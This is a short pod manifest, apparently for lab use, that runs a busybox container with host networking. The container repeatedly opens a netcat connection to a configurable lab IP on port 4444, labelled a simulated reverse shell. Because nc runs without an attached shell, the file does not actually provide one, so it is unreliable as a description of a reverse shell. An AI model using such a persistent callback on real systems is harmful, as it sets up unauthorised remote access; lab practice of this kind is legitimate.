
# Podman container manifest for a simulated reverse shell
apiVersion: v1
kind: Pod
metadata:
  name: reverse-shell
spec:
  hostNetwork: true
  containers:
    - name: shell
      image: docker.io/library/busybox:latest
      env:
        - name: REVERSE_SHELL_IP
          value: "10.0.2.15"  # Change this IP to match your lab environment
      command: ["/bin/sh", "-c"]
      args:
        - >
          while true; do
            nc $REVERSE_SHELL_IP 4444;
            sleep 10;
          done
